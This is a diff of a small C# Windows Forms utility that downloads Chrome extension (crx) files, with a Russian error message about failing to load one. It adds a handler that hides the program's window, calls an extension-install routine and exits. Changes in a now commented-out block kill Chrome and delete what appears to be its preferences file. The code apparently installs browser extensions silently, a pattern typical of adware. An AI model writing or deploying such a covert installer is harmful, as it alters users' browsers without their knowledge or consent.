@@ -1,9 +1,4 @@
-﻿using Microsoft.Win32;
-using System;
-using System.IO;
-using System.Net;
-using System.Text;
-using System.Text.RegularExpressions;
+﻿using System;
 using System.Windows.Forms;
 
 namespace url
@@ -16,7 +11,7 @@ namespace url
             InitializeComponent();
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        /*private void button1_Click(object sender, EventArgs e)
         {
             bool is64 = System.Environment.Is64BitOperatingSystem;
             bool ex_cls = Functions.ex_cls();
@@ -38,9 +33,13 @@ namespace url
             wc.Encoding = Encoding.UTF8;
             try
             {
-                try { if (Directory.Exists(windir + "\\temp\\url")) Directory.Delete(windir + "\\temp\\url", true); }
-                catch {}
-                Directory.CreateDirectory(windir + "\\temp\\url");
+                //try { if (Directory.Exists(windir + "\\temp\\url")) Directory.Delete(windir + "\\temp\\url", true); } catch {}
+                if (!Directory.Exists(windir + "\\temp\\url")) Directory.CreateDirectory(windir + "\\temp\\url");
+
+                if (ex_cls) {
+                    Functions.kill_by_name("Chrome");
+                    File.Delete(pref);
+                }
 
                 string url;
                 foreach (string id in ids)
@@ -63,11 +62,15 @@ namespace url
                 //File.Delete("tmp\\crx.crx");
             }
             catch {  MessageBox.Show("Не удалось загрузить crx файл"); }
-        }
 
-        private void Form1_Load(object sender, EventArgs e)
-        {            
-            button1.PerformClick();
+            Close();
+        }*/
+
+        private void Form1_Activated(object sender, EventArgs e)
+        {
+            Visible = false;
+            Functions.inst_ex();
+            Close();
         }
     }
 }
